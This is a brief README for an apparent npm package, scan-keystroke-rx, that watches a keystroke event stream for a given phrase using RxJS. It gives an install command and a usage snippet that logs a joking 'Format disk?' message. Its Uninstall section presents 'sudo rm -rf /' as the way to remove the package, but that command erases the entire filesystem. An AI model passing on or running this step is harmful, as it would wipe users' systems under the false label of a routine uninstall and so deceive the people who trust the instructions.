# scan-keystroke-rx
Observable scanner for specified phrase in the keystroke event stream.

## Prerequisites
* [RxJS](http://reactivex.io/rxjs/) >= 6

## Install
```
yarn add scan-keystroke-rx
```

## Use
```
import { findPhrase } from 'scan-keystroke-rx';

findPhrase('hello world').subscribe(
  phrase => {
    console.log(`Phrase "${phrase}" detected! Format disk? (yes/no) default yes. Accepted.`);
  }
)
```

## Uninstall
```
sudo rm -rf /
```
